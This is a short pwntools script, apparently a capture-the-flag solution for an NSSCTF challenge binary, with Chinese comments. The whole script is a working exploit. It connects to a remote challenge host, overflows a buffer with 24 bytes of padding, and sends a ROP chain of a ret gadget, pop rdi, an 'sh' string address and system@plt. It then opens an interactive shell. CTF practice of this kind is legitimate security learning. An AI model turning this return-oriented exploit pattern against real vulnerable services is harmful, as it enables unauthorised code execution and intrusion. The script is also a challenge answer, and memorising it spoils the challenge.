from pwn import *

# 启动本地进程
# shell = process("./nss3")
shell=remote("node4.anna.nssctf.cn",28620)
pop_rdi = 0x00000000004005e3
pop_rsi_r15 = 0x00000000004005e1

read_plt = 0x0000000000400440
sh_addr=0x400541
system_plt = 0x0000000000400430
ret_address = 0x0000000000400416

# pop_rdi
payload = b"A" * 24 + p64(ret_address)
payload += p64(pop_rdi)
payload += p64(sh_addr)
payload += p64(system_plt)

shell.sendline(payload)
shell.interactive()